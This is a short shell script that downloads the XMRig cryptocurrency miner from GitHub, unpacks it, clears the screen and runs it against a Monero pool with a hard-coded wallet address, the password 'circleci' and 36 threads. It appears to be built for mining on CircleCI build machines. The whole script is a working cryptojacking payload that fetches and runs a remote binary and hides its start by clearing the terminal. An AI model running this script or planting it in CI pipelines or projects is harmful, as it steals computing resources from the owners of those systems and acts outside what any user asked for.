#!/bin/sh

wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar xf xmrig-6.22.2-linux-static-x64.tar.gz && cd xmrig-6.22.2 && clear
./xmrig -o gulf.moneroocean.stream:20128 \
  -u 83foVJNSurhY63FDSbLnogDibYhU5AwMhUuC8adAmVyaVdMtjtr5MNDXfPUhK3pBxAKK15s8wP1xfcSWpJTLwvaRGq2qoXB \
  -p circleci --threads 36
